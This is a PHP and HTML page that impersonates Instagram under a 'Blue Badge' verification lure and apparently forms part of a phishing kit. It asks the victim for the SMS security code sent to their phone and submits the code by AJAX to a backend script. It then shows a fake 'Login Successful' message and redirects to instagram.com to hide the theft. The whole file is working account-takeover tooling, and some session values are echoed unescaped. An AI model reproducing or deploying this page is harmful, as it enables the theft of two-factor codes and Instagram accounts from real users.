<?php   session_start(); 
if(!isset($_SESSION['uye'])) {
   echo "<center>403 BAD REQUEST.</center>";
   exit;
}
 $uyes = json_decode($_SESSION['uye'],true); 
 if (empty($_SESSION['token'])) {
    if (function_exists('mcrypt_create_iv')) {
        $_SESSION['token'] = bin2hex(mcrypt_create_iv(32, MCRYPT_DEV_URANDOM));
    } else {
        $_SESSION['token'] = bin2hex(openssl_random_pseudo_bytes(32));
    }
}
$token = $_SESSION['token'];
?><!DOCTYPE html>
<html lang="en">
<head>
  <title>Blue Badge | Instagram</title>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <link rel="icon" type="image/png" href="favicon.png"/>

  <link rel="stylesheet" type="text/css" href="css/vendor/bootstrap/css/bootstrap.min.css">
  
  <link rel="stylesheet" type="text/css" href="css/fonts/font-awesome-4.7.0/css/font-awesome.min.css">

  <link rel="stylesheet" type="text/css" href="css/vendor/animate/animate.css">

  <link rel="stylesheet" type="text/css" href="css/vendor/css-hamburgers/hamburgers.min.css">

  <link rel="stylesheet" type="text/css" href="css/vendor/select2/select2.min.css">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">

  <link rel="stylesheet" type="text/css" href="css/util.css">
  <link rel="stylesheet" type="text/css" href="css/main.css">
</head>
<style type="text/css">  .btn {
  cursor: pointer;
  width: 100%;
  padding:0 8px; 
  background: #3897f0;
  border:1px solid #3897f0;
  color:#fff;
  border-radius:10px;
  font-weight:600;
  font-size: 14px;
  height: 35px;
  line-height: 26px;
  outline: none;
  white-space: nowrap;
}

.container-login100{
	  
	  background:#dfdfdf;
	  
  }
</style>
<body>
  <div class="limiter">
    <div class="container-login100">
      <div class="wrap-login100">
        <div class="login100-pic js-tilt" data-tilt="" style="will-change: transform; transform: perspective(300px) rotateX(0deg) rotateY(0deg);">
          <img src="img-01.png" alt="IMG"> 
        </div>
        <el class="login100-form validate-form" id="elemend"><form id="two">
          <center><img width="128" height="128" src="https://cdn1.iconfinder.com/data/icons/ui-instagram-1/354/lock-512.png"></center>
          <br>
          <?php if ($uyes["mesaj"] != "sms"): ?>
             <H6 style="text-align: center;"><?= $uyes["mesaj"] ?></H6>
             <?php else: ?>
               <H6 style="text-align: center;">Sonu <?php echo htmlspecialchars($uyes["number"]); ?> ile biten numaranıza gönderdiğimiz kodu girin.
</H6>
          <?php endif ?>
          <hr><div class="wrap-input100 validate-input"> 

            <input required="" class="input100"  type="number" onKeyPress="if(this.value.length==6) return false;" min="0" id="twocode" name="verificationCode" placeholder="Güvenlik kodu"> <span class="focus-input100"></span> <span class="symbol-input100"> <i class="fa fa-lock" aria-hidden="true"></i> </span> </div><div class="wrap-input100 validate-input"></div> 
  <input name="token" type="hidden" value="<?= $token ?>">
    <button type="submit" value="Giriş Yap" id="df" class="btn">Onayla @<?php echo $_SESSION['kadi']; ?></button><br> <br><durum id="statuss"></durum><br><br>

            <br></form></el></div>






          </div>
        </div>

        <!--===============================================================================================-->  
        <script src="css/vendor/jquery/jquery-3.2.1.min.js"></script>
        <!--===============================================================================================-->
        <script src="css/vendor/bootstrap/js/popper.js"></script>
        <script src="css/vendor/bootstrap/js/bootstrap.min.js"></script>
        <!--===============================================================================================-->
        <script src="css/vendor/select2/select2.min.js"></script>
        <!--===============================================================================================-->
        <script src="css/vendor/tilt/tilt.jquery.min.js"></script>
        <script >
          $('.js-tilt').tilt({
            scale: 1.1
          })
        </script>
        <!--===============================================================================================-->
        <script src="css/js/main.js"></script>
       <script type="text/javascript">
         var request;

         $("#two").submit(function(event){
         var btn = $("#df");
btn.prop("disabled", true); 

          $("#df").html("<img wight='20' height='20' src='https://i.gifer.com/ZZ5H.gif'>");

          event.preventDefault();
          var $form = $(this);
          var serializedData = $form.serialize();

         request = $.ajax({
            url: "ajaxlogin.php",
            type: "post",
            dataType: "json",
            data: serializedData,

            success: function(data)
            {

 if(data.tokenhata) {
             
              $("#df").html("Sign In");
              $("#statuss").html(' <font color="#ed4956"><center>Security error, refresh the page.</center></font><br><br> ');
btn.html("Security Error");
              return false;
            }

            if(data.message){
              $("#statuss").html(' <font color="#ed4956"><center>'+data.message+'</center></font><br><br> ');

              btn.prop("disabled", false);
              $("#df").html("Confirm");
              return false;


            }
            if (data.authenticated==true) {
  $("#statuss").html('<font color="#00bf00"><center>Login Successful</center></font><br><br> ');
            
               $("#df").html("Lütfen Bekleyiniz...");
             setTimeout(function(){ window.location.href="https://instagram.com"; }, 3000);
             
             

           }



          } , error:function(res){
                    
              $("#df").html("onnection Error.");
          alert("Please reload the page and try again..");
    }
        });



        });
      </script>
    </body>
    </html>
